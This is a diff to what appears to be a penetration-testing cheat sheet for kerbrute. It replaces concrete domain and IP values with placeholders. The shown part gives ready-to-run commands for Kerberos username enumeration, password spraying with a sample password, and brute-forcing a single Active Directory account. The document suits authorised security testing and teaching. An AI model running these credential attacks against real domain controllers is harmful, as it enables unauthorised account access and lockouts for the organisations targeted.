@@ -22,7 +22,7 @@ You can reach a domain controller on port 88 and have a list of candidate userna
 - `userenum`: check which usernames exist.
 - `passwordspray`: try one password against a list of users.
 - `bruteuser`: try a password list against a single user.
-- `-d DOMAIN.local`: the target domain.
+- `-d DOMAIN`: the target domain.
 - `--dc DC_IP`: the domain controller to ask (otherwise resolved from DNS).
 - `-o out.txt`: write results to a file.
 - `--safe`: stop a user's spray if it looks close to lockout.
@@ -32,19 +32,19 @@ You can reach a domain controller on port 88 and have a list of candidate userna
 Enumerate valid usernames from a candidate list:
 
 ```bash
-kerbrute userenum -d DOMAIN.local --dc 10.10.10.5 users.txt
+kerbrute userenum -d DOMAIN --dc TARGET users.txt
 ```
 
 Spray one password across the accounts that exist (check the lockout policy first):
 
 ```bash
-kerbrute passwordspray -d DOMAIN.local --dc 10.10.10.5 valid-users.txt 'Autumn2024!'
+kerbrute passwordspray -d DOMAIN --dc TARGET valid-users.txt 'Autumn2024!'
 ```
 
 Try a password list against one known user:
 
 ```bash
-kerbrute bruteuser -d DOMAIN.local --dc 10.10.10.5 passwords.txt jsmith
+kerbrute bruteuser -d DOMAIN --dc TARGET passwords.txt jsmith
 ```
 
 ## Workflow
